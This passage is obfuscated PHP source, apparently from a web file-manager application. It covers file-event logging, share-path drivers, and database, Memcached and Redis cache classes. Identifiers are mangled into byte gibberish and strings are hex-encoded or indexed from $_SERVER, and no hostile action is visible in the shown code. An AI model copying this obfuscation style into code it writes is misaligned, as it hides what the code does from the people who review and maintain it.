{ return array($ä©ÑÆ¬û[419] => 0, $ä©ÑÆ¬û[1863] => $«Ì†®¬Õ[$ä©ÑÆ¬û[2017]], $ä©ÑÆ¬û[420] => $ä©ÑÆ¬û[12], $ä©ÑÆ¬û[1880] => $ä©ÑÆ¬û[2073]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\165\x72\x63\145\x5f\x65\x76\145\156\164"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\145\124\151\155\x65", "\164\x69\155\145", "\x69\156\x73\145\x72\x74", "\x66\165\156\143\x74\x69\x6f\156"), array("\144\145\163\x63", '', "\151\156\163\145\x72\164\54\165\x70\144\141\164\x65\x2c\163\x65\x6c\145\143\164", "\x6a\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ÙÑğÀµš, $Ş›ı°À, $®øæùü³ = '') { $Ë‚ã¢Ä =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->eventSave) { return; } $Œµ½ü£ˆ = Model($Ë‚ã¢Ä[1341])->sourceInfo($ÙÑğÀµš); if (!$Œµ½ü£ˆ) { return !1; } if ($this->isCacheEvent($Œµ½ü£ˆ, $Ş›ı°À)) { return; } if ($®øæùü³ && is_string($®øæùü³)) { $®øæùü³ = array($Ë‚ã¢Ä[1896] => $®øæùü³); } $…ï¦Ë“î = array($Ë‚ã¢Ä[417] => $ÙÑğÀµš, $Ë‚ã¢Ä[2074] => $Œµ½ü£ˆ[$Ë‚ã¢Ä[432]], $Ë‚ã¢Ä[2075] => $Œµ½ü£ˆ[$Ë‚ã¢Ä[32]], $Ë‚ã¢Ä[519] => !empty($Œµ½ü£ˆ[$Ë‚ã¢Ä[519]]) ? $Œµ½ü£ˆ[$Ë‚ã¢Ä[519]] : $Ë‚ã¢Ä[12], $Ë‚ã¢Ä[1658] => USER_ID, $Ë‚ã¢Ä[422] => $Ş›ı°À, $Ë‚ã¢Ä[1660] => $®øæùü³); $this->addSystemLog($Ş›ı°À, $…ï¦Ë“î); unset($…ï¦Ë“î[$Ë‚ã¢Ä[2075]], $…ï¦Ë“î[$Ë‚ã¢Ä[519]]); return $this->add($…ï¦Ë“î); } private function addSystemLog($ªÜÁàë, $¶çŞ«İ´) { $Üåñœş =& $_SERVER[Ì¥ŞÒ°£]; if ($ªÜÁàë == $Üåñœş[2076]) { $ªÜÁàë = $¶çŞ«İ´[$Üåñœş[453]][$Üåñœş[2077]]; } else { if (in_array($ªÜÁàë, array($Üåñœş[1837], $Üåñœş[2078]))) { $ªÜÁàë = $¶çŞ«İ´[$Üåñœş[453]][$Üåñœş[757]]; } } $¹Æ»Óòé = array_merge($¶çŞ«İ´, array($Üåñœş[2079] => $¶çŞ«İ´[$Üåñœş[402]], $Üåñœş[2080] => $¶çŞ«İ´[$Üåñœş[2080]])); Hook::trigger($Üåñœş[2081], $Üåñœş[2082] . $ªÜÁàë, $¶çŞ«İ´); Model($Üåñœş[1801])->addLog($Üåñœş[2082] . $ªÜÁàë, $¹Æ»Óòé); } private function isCacheEvent($Ö¨ıê¸, $æ¿ÜÅÖª) { if ($Ö¨ıê¸[$_SERVER[Ì¥ŞÒ°£][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ÚúÆ—ª, $ä˜áœ´á) { $ª©ıî­Ä =& $_SERVER[Ì¥ŞÒ°£]; $ûè‚œ†õ = Model($ª©ıî­Ä[1341])->sourceInfo($ÚúÆ—ª); $ë¼ßæ’× = array($ª©ıî­Ä[2077] => $ä˜áœ´á, $ª©ıî­Ä[32] => $ûè‚œ†õ[$ª©ıî­Ä[32]]); return $this->addEvent($ÚúÆ—ª, $ª©ıî­Ä[2076], $ë¼ßæ’×); } public function eventFileEdit($üÙêó³) { $ÍØ™±à– =& $_SERVER[Ì¥ŞÒ°£]; $¥¨€ÅÅ¨ = array($ÍØ™±à–[2083] => $_SERVER[$ÍØ™±à–[2084]], $ÍØ™±à–[2085] => strtolower(ACTION)); if (isset($GLOBALS[$ÍØ™±à–[7]][$ÍØ™±à–[2086]])) { $¥¨€ÅÅ¨[$ÍØ™±à–[2086]] = $ÍØ™±à–[88]; } return $this->addEvent($üÙêó³, $ÍØ™±à–[1827], $¥¨€ÅÅ¨); } public function eventRecycle($É‡™ù, $ìíÛÇš) { return $this->addEvent($É‡™ù, $_SERVER[Ì¥ŞÒ°£][2078], $ìíÛÇš); } public function eventRemove($ùÚßì…) { $Ğƒ€õ»— =& $_SERVER[Ì¥ŞÒ°£]; $‹£‰Ã«Ñ = Model($Ğƒ€õ»—[1341])->sourceInfo($ùÚßì…); $ËŒÃÔ¿” = $‹£‰Ã«Ñ[$Ğƒ€õ»—[32]]; return $this->addEvent($‹£‰Ã«Ñ[$Ğƒ€õ»—[432]], $Ğƒ€õ»—[1826], $ËŒÃÔ¿”); } public function eventShare($óö”óÑ§, $—ó½Ÿí×) { return $this->addEvent($óö”óÑ§, $_SERVER[Ì¥ŞÒ°£][1837], $—ó½Ÿí×); } public function eventMove($·Ã²¾¨®, $Êˆ’‚ó¬, $µ¢ïæĞï) { $©ŒÄ™¢Ó =& $_SERVER[Ì¥ŞÒ°£]; $ê™ãµğ = Model($©ŒÄ™¢Ó[1341]); $çéÂ¾³Ù = $ê™ãµğ->sourceInfo($·Ã²¾¨®); $’´ÛÎ›Æ = $ê™ãµğ->sourceInfo($Êˆ’‚ó¬); $¸·ƒÉ£ğ = $ê™ãµğ->sourceInfo($µ¢ïæĞï); $‘àØøÉ = array($©ŒÄ™¢Ó[1165] => $Êˆ’‚ó¬, $©ŒÄ™¢Ó[2087] => $’´ÛÎ›Æ[$©ŒÄ™¢Ó[32]], $©ŒÄ™¢Ó[2065] => !empty($’´ÛÎ›Æ[$©ŒÄ™¢Ó[519]]) ? $’´ÛÎ›Æ[$©ŒÄ™¢Ó[519]] : $©ŒÄ™¢Ó[12], $©ŒÄ™¢Ó[1166] => $µ¢ïæĞï, $©ŒÄ™¢Ó[2088] => $¸·ƒÉ£ğ[$©ŒÄ™¢Ó[32]], $©ŒÄ™¢Ó[2089] => !empty($¸·ƒÉ£ğ[$©ŒÄ™¢Ó[519]]) ? $¸·ƒÉ£ğ[$©ŒÄ™¢Ó[519]] : $©ŒÄ™¢Ó[12]); $this->addEvent($·Ã²¾¨®, $©ŒÄ™¢Ó[557], $‘àØøÉ); $çéÂ¾³Ù = $ê™ãµğ->sourceInfo($·Ã²¾¨®); $‘àØøÉ = array($©ŒÄ™¢Ó[402] => $çéÂ¾³Ù[$©ŒÄ™¢Ó[402]], $©ŒÄ™¢Ó[32] => $çéÂ¾³Ù[$©ŒÄ™¢Ó[32]]); $this->addEvent($Êˆ’‚ó¬, $©ŒÄ™¢Ó[2090], $‘àØøÉ); } public function eventCopy($‡³éÛÒó) { $this->eventCreate($‡³éÛÒó, $_SERVER[Ì¥ŞÒ°£][555]); } public function eventRename($­ªª·¨°, $®Ù¾—¨ö, $õØÉù†«) { $Ğ¹·Ä‡œ =& $_SERVER[Ì¥ŞÒ°£]; $Ä¯Ç´öú = array($Ğ¹·Ä‡œ[1165] => $®Ù¾—¨ö, $Ğ¹·Ä‡œ[1166] => $õØÉù†«); return $this->addEvent($­ªª·¨°, $Ğ¹·Ä‡œ[1356], $Ä¯Ç´öú); } public function eventAddComment($ß—¹—´Æ, $¨°ÌØ×) { return $this->addEvent($ß—¹—´Æ, $_SERVER[Ì¥ŞÒ°£][2091], $¨°ÌØ×); } public function eventAddDesc($üªëôˆ×, $ú¬È ) { return $this->addEvent($üªëôˆ×, $_SERVER[Ì¥ŞÒ°£][2092], $ú¬È ); } public function listBySource($Á§—ŞÍê) { $ï˜¦½úô =& $_SERVER[Ì¥ŞÒ°£]; $°¿½­Æ = Model($ï˜¦½úô[1341])->sourceInfo($Á§—ŞÍê); $ÇÎ¡Ü¶ü = array($ï˜¦½úô[417] => $Á§—ŞÍê); if ($°¿½­Æ[$ï˜¦½úô[410]] == $ï˜¦½úô[88]) { $ÎùÛ†¹æ = Model($ï˜¦½úô[1341])->listSearchChildren($Á§—ŞÍê, 20000); $ÎùÛ†¹æ[] = $Á§—ŞÍê . $ï˜¦½úô[378]; $ÇÎ¡Ü¶ü = array($ï˜¦½úô[402] => array($ï˜¦½úô[7], $ÎùÛ†¹æ)); } $ªĞ´î„ = $this->where($ÇÎ¡Ü¶ü)->order($ï˜¦½úô[2093])->selectPage(); if ($ªĞ´î„[$ï˜¦½úô[366]][$ï˜¦½úô[367]] == 0) { $ªĞ´î„[$ï˜¦½úô[366]][$ï˜¦½úô[367]] = 1; $ªĞ´î„[$ï˜¦½úô[369]] = array(array($ï˜¦½úô[417] => $Á§—ŞÍê, $ï˜¦½úô[2074] => $°¿½­Æ[$ï˜¦½úô[432]], $ï˜¦½úô[1658] => $°¿½­Æ[$ï˜¦½úô[454]], $ï˜¦½úô[422] => $ï˜¦½úô[2094], $ï˜¦½úô[423] => $°¿½­Æ[$ï˜¦½úô[200]], $ï˜¦½úô[1660] => $ï˜¦½úô[12])); } return $this->eventListParse($ªĞ´î„, $Á§—ŞÍê); } private function eventListParse($¦ÙŒŒê¤, $´‚œÌÒï) { $îÃÆ·²Ó =& $_SERVER[Ì¥ŞÒ°£]; $ñ‹Û¬¶„ = $¦ÙŒŒê¤[$îÃÆ·²Ó[369]]; $…§€Ôì¾ = array_to_keyvalue($ñ‹Û¬¶„, $îÃÆ·²Ó[12], $îÃÆ·²Ó[402]); $ìÛàí = array_to_keyvalue($ñ‹Û¬¶„, $îÃÆ·²Ó[12], $îÃÆ·²Ó[2080]); foreach ($ñ‹Û¬¶„ as $ƒì±¹°ê) { $¡î«ç²¤ = $ƒì±¹°ê[$îÃÆ·²Ó[453]]; if ($ƒì±¹°ê[$îÃÆ·²Ó[33]] == $îÃÆ·²Ó[557] && isset($¡î«ç²¤[$îÃÆ·²Ó[1165]])) { $…§€Ôì¾[] = $¡î«ç²¤[$îÃÆ·²Ó[1165]] . $îÃÆ·²Ó[12]; $…§€Ôì¾[] = $¡î«ç²¤[$îÃÆ·²Ó[1166]] . $îÃÆ·²Ó[12]; } if ($ƒì±¹°ê[$îÃÆ·²Ó[33]] == $îÃÆ·²Ó[2090] && isset($¡î«ç²¤[$îÃÆ·²Ó[402]])) { $…§€Ôì¾[] = $¡î«ç²¤[$îÃÆ·²Ó[402]] . $îÃÆ·²Ó[12]; } } $…§€Ôì¾ = array_merge($…§€Ôì¾, $ìÛàí, array($´‚œÌÒï . $îÃÆ·²Ó[12])); $…§€Ôì¾ = array_unique($…§€Ôì¾); $÷ú˜Íì = array_unique(array_to_keyvalue($ñ‹Û¬¶„, $îÃÆ·²Ó[12], $îÃÆ·²Ó[1667])); $‰åÃ¨Ş¸ = Model($îÃÆ·²Ó[535])->userListInfo($÷ú˜Íì); $î—¶›àê = Model($îÃÆ·²Ó[827])->sourceListInfo($…§€Ôì¾, !0); foreach ($ñ‹Û¬¶„ as &$ƒì±¹°ê) { if ($ƒì±¹°ê[$îÃÆ·²Ó[33]] == $îÃÆ·²Ó[557] && isset($ƒì±¹°ê[$îÃÆ·²Ó[453]][$îÃÆ·²Ó[1165]])) { $ƒì±¹°ê[$îÃÆ·²Ó[453]][$îÃÆ·²Ó[1165]] = $î—¶›àê[$ƒì±¹°ê[$îÃÆ·²Ó[453]][$îÃÆ·²Ó[1165]]]; $ƒì±¹°ê[$îÃÆ·²Ó[453]][$îÃÆ·²Ó[1166]] = $î—¶›àê[$ƒì±¹°ê[$îÃÆ·²Ó[453]][$îÃÆ·²Ó[1166]]]; } if ($ƒì±¹°ê[$îÃÆ·²Ó[33]] == $îÃÆ·²Ó[2090] && isset($ƒì±¹°ê[$îÃÆ·²Ó[453]][$îÃÆ·²Ó[402]])) { $ƒì±¹°ê[$îÃÆ·²Ó[453]][$îÃÆ·²Ó[402]] = $î—¶›àê[$ƒì±¹°ê[$îÃÆ·²Ó[453]][$îÃÆ·²Ó[402]]]; } $ƒì±¹°ê[$îÃÆ·²Ó[86]] = $î—¶›àê[$ƒì±¹°ê[$îÃÆ·²Ó[402]]]; $ƒì±¹°ê[$îÃÆ·²Ó[2095]] = $î—¶›àê[$ƒì±¹°ê[$îÃÆ·²Ó[2080]]]; if ($ƒì±¹°ê[$îÃÆ·²Ó[33]] == $îÃÆ·²Ó[1826]) { $ƒì±¹°ê[$îÃÆ·²Ó[2095]] = $ƒì±¹°ê[$îÃÆ·²Ó[86]]; $ƒì±¹°ê[$îÃÆ·²Ó[2080]] = $ƒì±¹°ê[$îÃÆ·²Ó[2095]][$îÃÆ·²Ó[402]]; $ƒì±¹°ê[$îÃÆ·²Ó[86]] = !1; $ƒì±¹°ê[$îÃÆ·²Ó[402]] = $îÃÆ·²Ó[12]; } $ƒì±¹°ê[$îÃÆ·²Ó[2025]] = $‰åÃ¨Ş¸[$ƒì±¹°ê[$îÃÆ·²Ó[1667]]]; } unset($ƒì±¹°ê); $¦ÙŒŒê¤[$îÃÆ·²Ó[369]] = $ñ‹Û¬¶„; return $¦ÙŒŒê¤; } public function removeBySource($°ŠÌ”á×) { $ÂÂÊÀš = array($_SERVER[Ì¥ŞÒ°£][417] => $°ŠÌ”á×); $this->where($ÂÂÊÀš)->remove(); } } goto aïëÀñ„±; A¿ÑÚ¢Ší: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ ¿ ØÛ½) { $this->pathParse = $ ¿ ØÛ½; $this->model = Model($_SERVER[Ì¥ŞÒ°£][1341]); } public function getPathOuter($¬ÔÓÊëÄ) { $¼¶šô™Ã =& $_SERVER[Ì¥ŞÒ°£]; if (!$¬ÔÓÊëÄ) { return $¬ÔÓÊëÄ; } $¬Û¾ è¨ = $this->parse($¬ÔÓÊëÄ); return trim(KodIO::makeShare($this->pathParse[$¼¶šô™Ã[399]], $¬Û¾ è¨[$¼¶šô™Ã[399]]), $¼¶šô™Ã[8]); } protected function infoParse($í“³úú¸, $Úö¸¬½ = false, $¾å±×¡Ş = false) { $™ÒÊª‘Ú =& $_SERVER[Ì¥ŞÒ°£]; $ä‹ï• = $this->pathParse[$™ÒÊª‘Ú[399]]; $Œ§å¦¤ = trim($this->pathParse[$™ÒÊª‘Ú[1174]], $™ÒÊª‘Ú[8]); return Action($™ÒÊª‘Ú[1349])->sharePathInfo($ä‹ï•, $Œ§å¦¤, $Úö¸¬½); } public function infoFull($’úÎ‡Ö…) { $²’‘ÓƒÉ =& $_SERVER[Ì¥ŞÒ°£]; $ı‹¶‘¶ = explode($²’‘ÓƒÉ[8], trim($’úÎ‡Ö…, $²’‘ÓƒÉ[8])); if (count($ı‹¶‘¶) > 1) { $Ë¾ˆê’ò = implode($²’‘ÓƒÉ[8], array_splice($ı‹¶‘¶, 1)); $§Ì´“‚ = $this->model->pathInfoByPath($ı‹¶‘¶[0], $Ë¾ˆê’ò); if (!$§Ì´“‚) { return !1; } $this->pathParse[$²’‘ÓƒÉ[1174]] = $§Ì´“‚[$²’‘ÓƒÉ[402]]; } return $this->infoParse($’úÎ‡Ö…); } public function listAll($ŒôâåÃü) { $È§¥É„ =& $_SERVER[Ì¥ŞÒ°£]; $üÃí™æÜ = IO::info($this->pathParse[$È§¥É„[84]]); if (!$üÃí™æÜ) { return array(); } $À¦ÓĞâÆ = $this->model->listAll($ŒôâåÃü); $—òÛ¯« = Model($È§¥É„[601])->getInfo($üÃí™æÜ[$È§¥É„[489]]); $‡¡øÎ = Action($È§¥É„[1349]); foreach ($À¦ÓĞâÆ as &$ùÊãÛ¢¶) { check_abort(); $ùÊãÛ¢¶[$È§¥É„[86]] = $‡¡øÎ->_shareItemeParse($ùÊãÛ¢¶[$È§¥É„[86]], $—òÛ¯«); } unset($ùÊãÛ¢¶); return $À¦ÓĞâÆ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ï¢œÉÈ®) { $this->pathParse = $ï¢œÉÈ®; $this->model = Model($_SERVER[Ì¥ŞÒ°£][1341]); } protected function infoParse($ùÛ°¾ğ°, $Å”àà¦ = false, $¯„òçâ  = false) { $Ïº§ü =& $_SERVER[Ì¥ŞÒ°£]; return Action($Ïº§ü[1180])->sharePathInfo($this->pathParse[$Ïº§ü[84]], !0, $Å”àà¦); } public function listPath($û‰ü½éÄ, $½ã”…•¸ = false) { $¬÷œ£ñ‰ =& $_SERVER[Ì¥ŞÒ°£]; $´ˆ´„©Ú = parent::listPath($û‰ü½éÄ, $½ã”…•¸); if (!$´ˆ´„©Ú) { return $´ˆ´„©Ú; } if (is_array($´ˆ´„©Ú[$¬÷œ£ñ‰[1350]])) { $´ˆ´„©Ú[$¬÷œ£ñ‰[1350]] = Action($¬÷œ£ñ‰[1180])->shareItemInfo($´ˆ´„©Ú[$¬÷œ£ñ‰[1350]]); } foreach ($´ˆ´„©Ú as $€ˆª´®¼ => $ÌŞ‰‘•Ü) { if (!in_array($€ˆª´®¼, array($¬÷œ£ñ‰[83], $¬÷œ£ñ‰[82]))) { continue; } foreach ($ÌŞ‰‘•Ü as $ ´Äƒñ => $£é¶öùá) { $´ˆ´„©Ú[$€ˆª´®¼][$ ´Äƒñ] = Action($¬÷œ£ñ‰[1180])->shareItemInfo($£é¶öùá); } } return $´ˆ´„©Ú; } public function listAll($šçÎ¥) { $å¨ÃÎ¯ =& $_SERVER[Ì¥ŞÒ°£]; $‘»ÍŒµ¡ = IO::info($this->pathParse[$å¨ÃÎ¯[84]]); if (!$‘»ÍŒµ¡) { return array(); } $Ğ•¹šì = $this->model->listAll($šçÎ¥); foreach ($Ğ•¹šì as &$ããËùŒÉ) { $ããËùŒÉ[$å¨ÃÎ¯[86]] = Action($å¨ÃÎ¯[1180])->shareItemInfo($ããËùŒÉ[$å¨ÃÎ¯[86]]); } unset($ããËùŒÉ); return $Ğ•¹šì; } } class PathDriverDriverShareItem { public function __construct($ôŸ»°È) { $this->pathParse = $ôŸ»°È; } public function __call($ÒüÍƒ¬€, $¸¿•¢“) { $àøæ¡ôÕ =& $_SERVER[Ì¥ŞÒ°£]; if (method_exists($this, $ÒüÍƒ¬€)) { return; } $›Ô»Ø»… = call_user_func_array(array($àøæ¡ôÕ[1351], $ÒüÍƒ¬€), $¸¿•¢“); $ÒĞÔòÁ½ = array($àøæ¡ôÕ[1352], $àøæ¡ôÕ[1353], $àøæ¡ôÕ[1354], $àøæ¡ôÕ[1355], $àøæ¡ôÕ[555], $àøæ¡ôÕ[557], $àøæ¡ôÕ[1356], $àøæ¡ôÕ[107], $àøæ¡ôÕ[1357], $àøæ¡ôÕ[1358]); if (in_array($ÒüÍƒ¬€, $ÒĞÔòÁ½)) { $›Ô»Ø»… = $this->getPathOuter($›Ô»Ø»…); } return $›Ô»Ø»…; } public function copy($î—¦«¹Í, $ˆ¯¾ù½, $ŠÅ—Â†’ = false, $Ì­–Êƒ = false) { return $this->copyMove($î—¦«¹Í, $ˆ¯¾ù½, $ŠÅ—Â†’, $_SERVER[Ì¥ŞÒ°£][555], $Ì­–Êƒ); } public function move($â¤­¸÷™, $ú¡ÖöËÔ, $ù İ¨’º = false, $ÊÔ®ÎÏ = false) { return $this->copyMove($â¤­¸÷™, $ú¡ÖöËÔ, $ù İ¨’º, $_SERVER[Ì¥ŞÒ°£][557], $ÊÔ®ÎÏ); } private function copyMove($ÀõêÒ¸Æ, $í³º¨¦„, $Š ‚üÇ×, $æ“–õÅ±, $´­™ùş´ = false) { $Ô”ç =& $_SERVER[Ì¥ŞÒ°£]; $öÖÙ×ºó = $í³º¨¦„; $‡òÑÕĞ = IO::driverMake($í³º¨¦„); if ($‡òÑÕĞ->pathParse[$Ô”ç[1156]]) { $í³º¨¦„ = $‡òÑÕĞ->pathParse[$Ô”ç[1156]]; } else { $í³º¨¦„ = $öÖÙ×ºó; } $à–Ø×ó¶ = IO::copyMove($ÀõêÒ¸Æ, $í³º¨¦„, $Š ‚üÇ×, $æ“–õÅ±, $´­™ùş´); $à–Ø×ó¶ = $this->getPathOuter($à–Ø×ó¶); return $à–Ø×ó¶; } public function pathThis($Òàû‹ûÑ) { return get_path_this($this->pathParse[$_SERVER[Ì¥ŞÒ°£][84]]); } public function pathFather($«İ£¦¬á) { return get_path_father($this->pathParse[$_SERVER[Ì¥ŞÒ°£][84]]); } public function iconvSystem($€®¨ìİ) { return $€®¨ìİ; } protected function infoParse($¦ŸõüìÚ, $–ª‰ÅßÔ = false) { $×ø¯åû¼ =& $_SERVER[Ì¥ŞÒ°£]; $Ò†ÛºĞ = $this->pathParse[$×ø¯åû¼[487]][$×ø¯åû¼[1181]] . $this->pathParse[$×ø¯åû¼[1174]]; if ($–ª‰ÅßÔ) { $íšï´éÖ = IO::infoWithChildren($Ò†ÛºĞ); } else { $íšï´éÖ = IO::info($Ò†ÛºĞ); } $ˆ Û“ŸŠ = $this->pathParse[$×ø¯åû¼[487]]; return Action($×ø¯åû¼[1349])->_shareItemeParse($íšï´éÖ, $ˆ Û“ŸŠ); } public function listAll($íöÔóÕ±) { $ÕÍ¹ôĞ¥ =& $_SERVER[Ì¥ŞÒ°£]; $¢éÇ¡Æ¡ = IO::listAll($íöÔóÕ±); $›ÀºËÙé = $this->pathParse[$ÕÍ¹ôĞ¥[487]]; foreach ($¢éÇ¡Æ¡ as &$µÅÚŸÆ) { check_abort(); $Èä”õÃ = IO::info($µÅÚŸÆ[$ÕÍ¹ôĞ¥[84]]); $Èä”õÃ = is_array($Èä”õÃ) ? $Èä”õÃ : array(); $µÅÚŸÆ = array_merge($Èä”õÃ, $µÅÚŸÆ); $µÅÚŸÆ[$ÕÍ¹ôĞ¥[86]] = Action($ÕÍ¹ôĞ¥[1349])->_shareItemeParse($µÅÚŸÆ, $›ÀºËÙé); } unset($µÅÚŸÆ); return $¢éÇ¡Æ¡; } public function getPathOuter($ó‚îÅ¿Ã) { $ŸÎ“—Œ =& $_SERVER[Ì¥ŞÒ°£]; $ŠÇ×ğ¿ = KodIO::parse($ó‚îÅ¿Ã); if ($ŠÇ×ğ¿[$ŸÎ“—Œ[33]] == KodIO::KOD_SHARE_ITEM) { return $ŠÇ×ğ¿[$ŸÎ“—Œ[84]]; } $˜Ÿ±í”× = KodIO::clear($ó‚îÅ¿Ã); $¦ı¾ïËû = KodIO::clear($this->pathParse[$ŸÎ“—Œ[487]][$ŸÎ“—Œ[1181]]); $€ÓÔ›¾  = substr($˜Ÿ±í”×, strlen($¦ı¾ïËû)); if (substr($˜Ÿ±í”×, 0, strlen($¦ı¾ïËû)) != $¦ı¾ïËû) { return !1; } return $this->pathParse[$ŸÎ“—Œ[1175]] . $ŸÎ“—Œ[8] . ltrim($€ÓÔ›¾ , $ŸÎ“—Œ[8]); } public function getType() { $ßØÅş³¢ =& $_SERVER[Ì¥ŞÒ°£]; $İ¸ïûùñ = str_replace($ßØÅş³¢[74], $ßØÅş³¢[12], get_class($this)); return strtolower($İ¸ïûùñ); } public function isTypeObject($áÃ¢×¬ì) { return IO::isTypeObject($áÃ¢×¬ì); } public function info($À˜‹º›) { return $this->infoParse($À˜‹º›); } public function infoAuth($›‚ñ¢Öª) { return $this->infoParse($›‚ñ¢Öª); } public function infoWithChildren($½‹É†Ò) { return $this->infoParse($½‹É†Ò, !0); } public function infoFull($íŞòÁ¡´) { return $this->infoParse($íŞòÁ¡´); } } goto aÍ‰±™¦ê; EË¹†°¢ë: class CacheLockDatabase { public function lock($Ûøè´ãÉ, $İÓñííù = 0) { $·×ÂŒò¨ = Model($_SERVER[Ì¥ŞÒ°£][831]); $ğóªü¹‹ = microtime(!0) + $İÓñííù; while (microtime(!0) < $ğóªü¹‹) { $‰üäêâÚ = $·×ÂŒò¨->get($Ûøè´ãÉ); if (!$‰üäêâÚ || $‰üäêâÚ < microtime(!0)) { $—€½¡»¸ = $·×ÂŒò¨->set($Ûøè´ãÉ, $ğóªü¹‹); if ($—€½¡»¸) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($½‚Ÿì–†) { return Model($_SERVER[Ì¥ŞÒ°£][831])->get($½‚Ÿì–†); } public function unlock($Æä¯ò¿) { Model($_SERVER[Ì¥ŞÒ°£][831])->remove($Æä¯ò¿); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ïâ‡Óá„, $„óÖÜ©¥) { $‘°³²ğğ =& $_SERVER[Ì¥ŞÒ°£]; if (!class_exists($‘°³²ğğ[864])) { show_json($‘°³²ğğ[865], !1); } $this->cacheTime = $„óÖÜ©¥; $this->handle = new Memcached(); if (is_array($ïâ‡Óá„[$‘°³²ğğ[866]]) && count($ïâ‡Óá„[$‘°³²ğğ[866]]) >= 1) { foreach ($ïâ‡Óá„[$‘°³²ğğ[866]] as $æÜ÷‰Ù) { $ûÛõîÈæ = explode($‘°³²ğğ[4], $æÜ÷‰Ù); $this->handle->addServer($ûÛõîÈæ[0], $ûÛõîÈæ[1]); } } else { $this->handle->addServer($ïâ‡Óá„[$‘°³²ğğ[181]], $ïâ‡Óá„[$‘°³²ğğ[182]]); } } public function set($¡âèøÖ×, $ìê¢Ò—, $ã…™à’Ì = false) { $ã…™à’Ì = $ã…™à’Ì ? $ã…™à’Ì : $this->cacheTime; return $this->handle->set($¡âèøÖ×, $ìê¢Ò—, $ã…™à’Ì); } public function get($¥·à£Ëµ) { return $this->handle->get($¥·à£Ëµ); } public function remove($¨îÆøî) { return $this->handle->delete($¨îÆøî); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¸¸•Ñ“¸, $¨éÖ¬·ú) { $œÃÎÀÕï =& $_SERVER[Ì¥ŞÒ°£]; if (!class_exists($œÃÎÀÕï[867])) { show_json($œÃÎÀÕï[868], !1); } $this->cacheTime = $¨éÖ¬·ú; $³ßÆğ–§ = isset($¸¸•Ñ“¸[$œÃÎÀÕï[869]]) ? $¸¸•Ñ“¸[$œÃÎÀÕï[869]] : 10; $œû¼£€© = _get($¸¸•Ñ“¸, $œÃÎÀÕï[866]); if ($œû¼£€© && is_array($œû¼£€©)) { $this->initCluster($¸¸•Ñ“¸, $³ßÆğ–§); } else { $this->handle = $this->init($¸¸•Ñ“¸, $³ßÆğ–§); } } private function init($ªÓ—ñ¨ê, $ÙşÙ“×Í) { $¨ÒÚõ =& $_SERVER[Ì¥ŞÒ°£]; $³œ—Î“£ = new Redis(); $¢ƒşç ¥ = isset($ªÓ—ñ¨ê[$¨ÒÚõ[870]]) ? $ªÓ—ñ¨ê[$¨ÒÚõ[870]] : !1; if ($¢ƒşç ¥) { $³œ—Î“£->pconnect($ªÓ—ñ¨ê[$¨ÒÚõ[181]], $ªÓ—ñ¨ê[$¨ÒÚõ[182]], $ÙşÙ“×Í); } else { $³œ—Î“£->connect($ªÓ—ñ¨ê[$¨ÒÚõ[181]], $ªÓ—ñ¨ê[$¨ÒÚõ[182]], $ÙşÙ“×Í); } if (!empty($ªÓ—ñ¨ê[$¨ÒÚõ[413]])) { $³œ—Î“£->auth($ªÓ—ñ¨ê[$¨ÒÚõ[413]]); } if (!empty($ªÓ—ñ¨ê[$¨ÒÚõ[760]]) && $ªÓ—ñ¨ê[$¨ÒÚõ[760]] != 0) { $³œ—Î“£->select($ªÓ—ñ¨ê[$¨ÒÚõ[760]]); } return $³œ—Î“£; } private function initCluster($™ëò¦Ö, $ğœ¾ÂÅ™) { $€ÊÔÁ°® =& $_SERVER[Ì¥ŞÒ°£]; $¢è§áØî = array($€ÊÔÁ°®[871], $€ÊÔÁ°®[872], $€ÊÔÁ°®[873]); $·ú¯Û® = $€ÊÔÁ°®[871]; if (isset($™ëò¦Ö[$€ÊÔÁ°®[16]]) && in_array($™ëò¦Ö[$€ÊÔÁ°®[16]], $¢è§áØî)) { $·ú¯Û® = $™ëò¦Ö[$€ÊÔÁ°®[16]]; } switch ($·ú¯Û®) { case $€ÊÔÁ°®[871]: $this->_slave($™ëò¦Ö, $ğœ¾ÂÅ™); break; case $€ÊÔÁ°®[872]: break; case $€ÊÔÁ°®[873]: $this->isCluster = !0; $ÚÈàñ°Ø = $™ëò¦Ö[$€ÊÔÁ°®[866]]; $ñÃÜğæ = isset($™ëò¦Ö[$€ÊÔÁ°®[870]]) ? $™ëò¦Ö[$€ÊÔÁ°®[870]] : !1; $Û¾¡¶’Ï = isset($™ëò¦Ö[$€ÊÔÁ°®[413]]) ? $™ëò¦Ö[$€ÊÔÁ°®[413]] : null; $this->handle = new RedisCluster(NUll, $ÚÈàñ°Ø, $ğœ¾ÂÅ™, $ğœ¾ÂÅ™, $ñÃÜğæ, $Û¾¡¶’Ï); break; default: break; } } private function _slave($˜òÛĞ¦«, $£Ì­µ§å) { $üõ—šŞ = $˜òÛĞ¦«[$_SERVER[Ì¥ŞÒ°£][866]]; $this->filterConfig($˜òÛĞ¦«, $üõ—šŞ[0]); $this->handle = $this->init($˜òÛĞ¦«, $£Ì­µ§å); unset($üõ—šŞ[0]); if (empty($üõ—šŞ)) { return; } $„ÆôÕÏ = array_rand($üõ—šŞ); $this->filterConfig($˜òÛĞ¦«, $üõ—šŞ[$„ÆôÕÏ]); $this->slaveHandle = $this->init($˜òÛĞ¦«, $£Ì­µ§å); } private function filterConfig(&$õôçš±, $ÂÂ¦Ìºá) { $ñû¦º„ =& $_SERVER[Ì¥ŞÒ°£]; $‡¸è½ò’ = explode($ñû¦º„[4], $ÂÂ¦Ìºá); $«Üøß… = array($ñû¦º„[181] => $‡¸è½ò’[0], $ñû¦º„[182] => $‡¸è½ò’[1]); $õôçš± = array_merge($õôçš±, $«Üøß…); } public function set($É™Ù¬ Æ, $¿Øí°Òû, $ İÏôÄİ = false) { $ İÏôÄİ = $ İÏôÄİ ? $ İÏôÄİ : $this->cacheTime; return 